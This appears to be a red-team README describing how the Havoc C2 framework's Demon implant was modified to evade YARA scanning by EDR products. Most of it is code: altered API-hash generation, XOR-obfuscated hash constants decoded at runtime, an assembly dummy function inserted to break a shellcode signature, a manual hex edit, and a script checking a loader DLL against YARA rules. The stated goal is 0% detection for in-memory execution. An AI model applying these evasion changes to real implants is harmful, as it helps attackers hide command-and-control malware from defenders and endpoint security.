# Havoc-C2-Modification-YARA-Free

# POC of modifying YARA signautre on Havoc C2. 
This was during one of red team I had to modify open-source C2 to make YARA free, therefore it would be safer to execute in memory by a loader and evade 
common YARA scanning by EDRs. I was able to achieve 0% YARA detections. The main steps are the following:

1.Modify payloads/Demon/scripts/hash_func.py to generate different hash values that are flagged by YARA rules

```js
import sys

def hash_string( string ):
    try:
        hash = 5381

        for x in string.upper():
            hash = (( hash << 5 ) + hash ) + ord(x)


        # hash ^= 0xA5A5A5A5

        return hash & 0xFFFFFFFF
    except:
        pass

def hash_coffapi( string ):
    try:
        hash = 5381

        for x in string:
            hash = (( hash << 5 ) + hash ) + ord(x)

        
        # hash ^= 0xA5A5A5A5

        return hash & 0xFFFFFFFF
    except:
        pass

if __name__ in '__main__':
    try:
        print('#define H_FUNC_%s 0x%x' % ( sys.argv[ 1 ].upper(), hash_string( sys.argv[ 1 ] ) ));
        print('#define H_COFFAPI_%s 0x%x' % ( sys.argv[ 1 ].upper(), hash_coffapi( sys.argv[ 1 ] ) ));
    except IndexError:
        print('usage: %s [string]' % sys.argv[0]);
```

2.Replace them in payloads/Demon/include/Common/Define.h

```js
define XOR_KEY 0xA5A5A5A5


#define H_FUNC_LDRLOADDLL 0x3be0cfe6
#define H_FUNC_LDRGETPROCEDUREADDRESS 0x5942ce13
#define H_FUNC_NTADDBOOTENTRY 0x295962d3
#define H_FUNC_NTALLOCATEVIRTUALMEMORY 0x52261d49
#define H_FUNC_NTFREEVIRTUALMEMORY 0x8da763ac
#define H_FUNC_NTUNMAPVIEWOFSECTION 0xcf01b768
#define H_FUNC_NTWRITEVIRTUALMEMORY 0x66b2a437
#define H_FUNC_NTSETINFORMATIONVIRTUALMEMORY 0x31cf679c
#define H_FUNC_NTQUERYVIRTUALMEMORY 0xb5654df8
#define H_FUNC_NTOPENPROCESSTOKEN 0x90a86f3c
#define H_FUNC_NTOPENTHREADTOKEN 0x2596e277
```
3. Add the XOR logic in payloads/Demon/src/core/Win32.c, the idea is to dynamicly XORing back to the orignal values of the API hash functions during run time, so YARA will not flag the hardcoded values in demon.bin defined in Define.h

```js
#define XOR_KEY 0xA5A5A5A5 // the key we used to xor the hash values


PVOID LdrFunctionAddr(
    IN PVOID Module,
    IN DWORD Hash
) {
    PIMAGE_NT_HEADERS       NtHeader         = { 0 };
    PIMAGE_EXPORT_DIRECTORY ExpDirectory     = { 0 };
    SIZE_T                  ExpDirectorySize = { 0 };
    PDWORD                  AddrOfFunctions  = { 0 };
    PDWORD                  AddrOfNames      = { 0 };
    PWORD                   AddrOfOrdinals   = { 0 };
    PVOID                   FunctionAddr     = { 0 };
    PCHAR                   FunctionName     = { 0 };
    ANSI_STRING             AnsiString       = { 0 };

    if ( ! Module || ! Hash )
        return NULL;

    NtHeader         = C_PTR( Module + ( ( PIMAGE_DOS_HEADER ) Module )->e_lfanew );
    ExpDirectory     = C_PTR( Module + NtHeader->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress );
    ExpDirectorySize = U_PTR( Module + NtHeader->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].Size );

    AddrOfNames      = C_PTR( Module + ExpDirectory->AddressOfNames );
    AddrOfFunctions  = C_PTR( Module + ExpDirectory->AddressOfFunctions );
    AddrOfOrdinals   = C_PTR( Module + ExpDirectory->AddressOfNameOrdinals );

    if (IsPredefinedHash(Hash)) {
        Hash ^= XOR_KEY; // use the same key to xor back whenever the demon calls hashes APIs
    }

```

4. Modify the Havoc/payloads/Shellcode/Source/Asm/x64.Asm.s Assemby and add a dummy functions to break the ROP gadget logic to evade YARA detection 

`````js
; Define the dummy function
DummyFunction:
        ; Save registers (if needed)
        push    rax
        push    rbx
        push    rcx
        push    rdx

        ; Dummy operations
        nop     ; No operation
        nop     ; No operation
        nop     ; No operation

        ; Restore registers
        pop     rdx
        pop     rcx
        pop     rbx
        pop     rax

        ; Return from the dummy function
    ret

section .text$A
	Start:
        call    DummyFunction     // break the following calling logic    
        push    rsi               // <-----detection starts here
        nop                       
        mov		rsi, rsp
``````

5. manually remove and change one hex value

    Step 4 and 5 refer the following blog

    https://karma-x.io/blog/post/18/


6. The whole modified havoc is here, you can download and compile your own to make modificatio and YARA check using a simple python script with updated yara rules


```js
import os
import sys
import subprocess


directory = ('C:\\Users\\User\\Downloads\\Mem_Scan\\protections-artifacts-main\\protections-artifacts-main\\yara\\rules')
target = 'C:\\Users\\User\\Desktop\\Payloads\\Products\\double_module_stomp\\PayloadLoader\\x64\\Release\\DllLoader.dll'

for fileanme in os.listdir(directory):
    filepath = os.path.join(directory, fileanme)

    if os.path.isfile(filepath):
        cmd = ['yara64.exe','-s', filepath, target]
        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.stdout:
            with open('yara_loader_result.txt', 'a') as f:
                outout = f'Detected===>!!!\\n{filepath} ====>\n {result.stdout}'
                print(outout)

```

# DEMO

![alt text](URL)

